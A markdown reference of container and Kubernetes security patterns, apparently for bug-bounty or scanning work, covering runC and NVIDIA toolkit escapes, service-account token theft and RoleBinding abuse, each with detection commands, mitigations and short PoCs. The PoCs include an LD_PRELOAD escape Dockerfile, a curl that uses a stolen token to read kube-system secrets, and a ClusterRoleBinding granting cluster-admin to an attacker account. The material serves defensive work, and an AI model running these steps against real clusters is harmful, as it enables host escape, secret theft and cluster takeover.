# Bug Bounty Patterns 2024-2026 — container-security

## Overview

Post-2023 container / Kubernetes escapes and privilege-escalation chains from Wiz cloud
security analyses, MITRE ATT&CK Container matrix, SentinelOne K8s research, CVE-2024-21626
(runC), and CVE-2025-23266 (NVIDIA Container Toolkit). Last validated: 2026-04.
Emit findings via `../schemas/finding.json`.

## Pattern Index

| #   | Pattern                                             | Severity | Primary Source                   |
|-----|-----------------------------------------------------|----------|----------------------------------|
| P17 | runC container escape via PR_SET_NO_NEW_PRIVS       | Critical | CVE-2024-21626                   |
| P18 | NVIDIA Container Toolkit escape via LD_PRELOAD      | Critical | CVE-2025-23266                   |
| P19 | Kubernetes Service-Account token theft for lateral  | High     | Cloud Security Threat Data 2025  |
| P20 | RoleBinding / ClusterRoleBinding privilege abuse    | High     | MITRE ATT&CK Container Matrix    |

---

## Patterns

### P17. runC Container Escape via PR_SET_NO_NEW_PRIVS (CVE-2024-21626)

- **CVE / Source:** CVE-2024-21626; Wiz "Leaky Vessels" analysis (80% of cloud environments vulnerable at disclosure).
- **Summary:** runC’s `execve` path combined with an unsafe `prctl(PR_SET_NO_NEW_PRIVS)` transition and a file descriptor leaked from the host allows a malicious image or `exec` to access a host-side fd pointing at `/`, yielding full host filesystem access and escape.
- **Affected surface:** runC ≤ 1.1.11, Docker ≤ 25.0.2, containerd < 1.6.28, Kubernetes worker nodes using pre-patched container runtime; GPU / ML workloads common victims.
- **Detection (automated):**
  ```bash
  # On node
  runc --version
  docker info | grep -i runtime
  # Inside a test container — probe for the leak:
  ls -la /proc/self/fd/ 2>/dev/null | head
  # Check K8s pod specs for allowPrivilegeEscalation, capabilities
  kubectl get pods -A -o json | jq '.items[] |
    select(.spec.containers[].securityContext.allowPrivilegeEscalation != false) |
    .metadata.namespace + "/" + .metadata.name'
  ```
- **Exploitation / PoC:** Public PoC images (e.g., `snyk/leaky-vessels-static-detector`, `snyk/leaky-vessels-dynamic-detector`) — use only in owned labs; see the Snyk detector tooling for a non-weaponized verification path. Do not re-embed weaponized PoC here.
- **Indicators:** Container process with open fd to host `/`; unexpected reads from `/proc/1/root/*`; runtime audit log shows `execve` transitioning across namespaces.
- **Mitigation:** Patch runC ≥ 1.1.12 / Docker ≥ 25.0.3 / containerd ≥ 1.6.28 / BuildKit ≥ 0.12.5; enforce `seccomp: RuntimeDefault`; set `allowPrivilegeEscalation: false`, `readOnlyRootFilesystem: true`, drop all capabilities; use gVisor / Kata for untrusted workloads.
- **Cross-refs:** CWE-269, CWE-668; MITRE T1611; related → P18, P19.

### P18. NVIDIA Container Toolkit Escape via LD_PRELOAD (CVE-2025-23266)

- **CVE / Source:** CVE-2025-23266 (CVSS 9.0); identified in 2025; "three-line exploit".
- **Summary:** `nvidia-container-toolkit` / `nvidia-container-runtime` respects a container-controlled `LD_PRELOAD` during the hook phase, letting an attacker load a malicious shared object inside the privileged hook context and execute code on the host.
- **Affected surface:** Any Kubernetes node running GPU workloads with nvidia-container-toolkit prior to the patched release; AI/ML bounty targets disproportionately affected — 37% of AI environments observed vulnerable.
- **Detection (automated):**
  ```bash
  dpkg -l | grep nvidia-container-toolkit    # or rpm -qa
  # Audit GPU pods for LD_PRELOAD in env
  kubectl get pods -A -o json | jq '.items[] |
    select(.spec.containers[].env[]? | select(.name=="LD_PRELOAD")) |
    .metadata.namespace + "/" + .metadata.name'
  ```
- **Exploitation / PoC:**
  ```dockerfile
  # Attacker image sets LD_PRELOAD; nvidia hook loads the .so in host context
  FROM nvidia/cuda:12.3.0-base-ubuntu22.04
  COPY pwn.so /pwn.so
  ENV LD_PRELOAD=/pwn.so
  CMD ["nvidia-smi"]
  ```
  `pwn.so`'s constructor runs on the host side of the hook.
- **Indicators:** Node audit shows nvidia-ctk hook invoking shared objects outside allow-list; unusual outbound from node `kubelet` user.
- **Mitigation:** Upgrade nvidia-container-toolkit to the fixed release; sanitize container env in CRI hook; enable PodSecurity `restricted`; run GPU nodes in a separate, isolated node pool.
- **Cross-refs:** CWE-426, CWE-732; related → P17.

### P19. Kubernetes Service-Account Token Theft for Lateral Movement

- **CVE / Source:** Cloud security threat data 2025 — 22% of cloud environments saw SA-token theft activity pivoting from prod to financial systems.
- **Summary:** Compromised pod reads its mounted SA token (or a neighbor's via HostPath/shared volume), then uses it against the API server to enumerate secrets, create new pods, or impersonate (`kubectl auth can-i --as=…`). Bounded audiences (`--audience`) and projected tokens mitigate only if enforced.
- **Affected surface:** Pods with `automountServiceAccountToken: true` (default), pods binding HostPath/`/var/run/secrets`, RBAC permitting `get secrets` / `create pods/exec`.
- **Detection (automated):**
  ```bash
  # Enumerate pods still auto-mounting tokens they don't need
  kubectl get pods -A -o json | jq -r '.items[] |
    select(.spec.automountServiceAccountToken != false
           and (.spec.serviceAccountName // "default") == "default")
    | .metadata.namespace + "/" + .metadata.name'

  # Enumerate high-risk verbs per SA
  kubectl auth can-i --list --as=system:serviceaccount:ns:sa \
    | grep -E 'secrets|pods/exec|pods/attach|impersonate|escalate'
  ```
- **Exploitation / PoC:**
  ```bash
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -sk -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
  ```
- **Indicators:** API-server audit log: `get secrets` from non-controller SA; `create pods` with privileged spec; impersonation headers.
- **Mitigation:** `automountServiceAccountToken: false` by default; use projected tokens with short `expirationSeconds`; bound-audience tokens (`--service-account-issuer-discovery`); NetworkPolicy to block pod → API-server for workloads that don't need it.
- **Cross-refs:** CWE-522, CWE-200; MITRE T1552.004, T1528; related → P20.

### P20. RoleBinding / ClusterRoleBinding Privilege Abuse

- **CVE / Source:** MITRE ATT&CK Container Matrix; 2024-2025 K8s privesc research.
- **Summary:** A principal with `rolebindings.create` / `clusterrolebindings.create` (frequently granted to CI pipelines or helm-tiller legacy configs) binds high-priv ClusterRoles (`cluster-admin`, `edit`) to an attacker-controlled ServiceAccount, achieving cluster-admin.
- **Affected surface:** Any namespace where a principal has `rbac.authorization.k8s.io/rolebindings`/`clusterrolebindings: create`; often handed out to CI via too-broad `roles/admin` on the `default` namespace.
- **Detection (automated):**
  ```bash
  kubectl get clusterrolebindings -o json | jq -r '.items[] |
    select(.roleRef.name == "cluster-admin") |
    .metadata.name + " → " + (.subjects // [] | map(.kind+"/"+.name) | join(","))'

  # Who can create bindings?
  for ns in $(kubectl get ns -o name | cut -d/ -f2); do
    kubectl auth can-i create rolebindings -n "$ns" --list 2>/dev/null
  done
  ```
- **Exploitation / PoC:**
  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata: { name: pwn }
  roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
  subjects:
    - kind: ServiceAccount
      name: default
      namespace: attacker-ns
  ```
- **Indicators:** New ClusterRoleBinding to `cluster-admin` from non-admin source; RBAC audit log shows privilege-elevation edit.
- **Mitigation:** OPA/Kyverno admission policy blocking role-escalation; split `rolebinding.create` from workload roles; enforce `rbac.authorization.k8s.io` validation (default on ≥1.12 still allows escalation for cluster-admins).
- **Cross-refs:** CWE-269; MITRE T1078.003; related → P19.

---

## Cross-skill links
- Cloud: P11/P14 often terminate in K8s node compromise feeding P19 — `../../cloud-security/references/bounty_patterns_2024_2026.md`.
- IaC: admission-policy templates — `../../iac-security/references/bounty_patterns_2024_2026.md` (P27, P28).
- SCA: compromised base images as P17 entry vector — `../../sca-security/references/bounty_patterns_2024_2026.md`.
- Payload PoC additions: see `../payloads/container_escape_poc.md` (CVE-2024-21626 and CVE-2025-23266 lab PoCs).
